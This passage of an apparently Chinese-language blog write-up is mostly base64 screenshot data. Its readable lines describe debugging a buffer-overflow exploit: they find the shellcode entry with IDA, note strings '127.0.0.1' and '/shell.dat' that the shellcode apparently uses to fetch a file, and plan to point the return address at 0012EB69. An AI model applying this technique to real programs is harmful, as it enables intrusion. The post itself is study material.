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" alt=""> 此程序返回时，返回地址被覆盖为83EC8B55，此数值在shellcode中，目测是eip没有覆盖准？然后跳转出错。所以先试试准确跳到shellcode中。</p>
<h2 id="准确进入shellcode"><a href="#准确进入shellcode" class="headerlink" title="准确进入shellcode"></a>准确进入shellcode</h2><p>先找到shellcode的入口点，通过IDA慢慢找，发现程序入口点在CDD处，之后有些定位API和准备需要的127.0.0.1 /shell.dat字符串等操作 直接将返回地址改为shellcode的入口处0012EB69，然后抬高栈顶，然后运行试一试。。 <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAtoAAABzCAIAAAApADJrAAAUbklEQVR4nO2dS5bcOA5FuTQvTYvxQjz0sAa1kJr3QD2IsooivvwLiodzTzUNQeBHSfI1QxmZzvM8juM8E7hzHsfx626pyfbe6zG0zdO2d7Rk9pjPzo97ce+b7n3rfGmz9EeOwErDsMBgMBgMtsb+lSMwGAwGg8Fgu6zraAUGg8FgMBis39JuPQSDwWAw2GZre1UCNtJ2/wzAYDAYDLbZdm/FsD9yZHcrpthxHD9//wOeRvFcZv+K1Pb+AvAmoqyrf//128+PHz8+u8butzm/2iBHwGogRwCIS5R19e+/fjt3weM4cjmy+w2K7zXIEbAayBEA4hJlXf3IEc/RiF+OpMrvC+ncnr/NNDly/u+fC4//umQG5878Euukdzkb0z9t6OeL7KXaVNIlT73XVU87R/nHcvTLkdtPgOFftvwdKV14/NclMzh3Krd42sNGAuBn0rIwnBly5FeNyHBGFtuW4ny9pc+uk4hRlaCXEycXnDea8R4Pvdo/baQtmW7h/jx+eaGkKgI87ezxj2WAHMnFh+Wf3Z1/O5Vt857yT05GOG9Uqu5MBYDJV8kRuklJVhWcMoXBlqWAd5stR9gDjMIvnWoMlCPmYUxQOcLeXlvvG+TI7bk6DkKeKkeOu8hg/UfijzrYG3+qGkK65GzPmsEBb+Lb5IjyT8UvRer3pm458ulF8c/cWD97u3Jpko2RI/QuJaESpssXv9z52Gw58rnUI0eOuznr1cv+9vv9Y2HkyL+PsEJkhJYj9C4loRJ2CLLG3541gwPeRGg5klLyy5HkExl+J78H301xO